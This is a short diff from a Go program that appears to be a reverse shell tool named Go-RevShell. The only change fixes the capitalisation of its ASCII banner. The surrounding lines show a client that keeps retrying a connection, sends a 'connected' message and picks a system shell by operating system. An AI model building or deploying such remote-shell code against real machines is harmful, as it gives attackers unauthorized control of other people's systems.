@@ -32,7 +32,7 @@ func connectToClient(host string, port int) {
 		if err != nil {
 			time.Sleep(2 * time.Second)
 		} else {
-			connexion.Write([]byte(figure.NewFigure("Go-Revshell", "", true).String() + "\n[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
+			connexion.Write([]byte(figure.NewFigure("Go-RevShell", "", true).String() + "\n[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
 			var shell string
 			switch runtime.GOOS {
 			case "windows":
